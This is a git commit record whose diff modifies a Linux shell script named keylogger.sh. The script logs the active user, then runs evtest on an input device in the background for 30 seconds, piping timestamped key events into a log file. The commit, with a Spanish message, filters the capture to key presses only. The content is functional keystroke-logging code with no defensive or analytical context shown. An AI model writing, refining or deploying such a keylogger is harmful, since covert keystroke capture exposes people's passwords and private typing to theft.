d05c7b5e7d6020783070a97989d33697d5bd62db
Zyrakk <150195749+Zyrakk@users.noreply.github.com>
2025-02-12 23:38:51 +0100

    FEAT: Filtrado de solo teclas presionadas

--- keylogger.sh
+++ keylogger.sh
@@ -22,7 +22,7 @@ echo "[*] Iniciando captura de teclas por 30 segundos..." > "$LOG_FILE"
 echo "[*] Usuario activo: $(whoami)" >> "$LOG_FILE"
 
 # Captura teclas en segundo plano y las guarda en archivo
-evtest "$DEVICE" | awk '/EV_KEY/ {print strftime("[%Y-%m-%d %H:%M:%S]"), $NF}' >> "$LOG_FILE" &
+evtest "$DEVICE" | awk '/EV_KEY.*DOWN/ {print strftime("[%Y-%m-%d %H:%M:%S]"), $NF}' >> "$LOG_FILE" &
 PID=$!
 
 # Espera 30 segundos antes de detener la captura
